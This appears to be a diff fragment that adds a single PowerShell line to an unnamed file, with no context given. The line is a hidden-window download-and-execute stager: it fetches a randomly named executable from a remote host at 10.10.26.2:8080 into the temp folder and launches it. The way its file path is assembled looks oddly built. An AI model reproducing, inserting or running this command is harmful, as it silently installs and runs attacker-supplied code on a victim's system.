@@ -1,0 +1,1 @@
+powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\UPFviEKU.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.26.2:8080/LIvfd6Gs0kp', $z); invoke-item $z
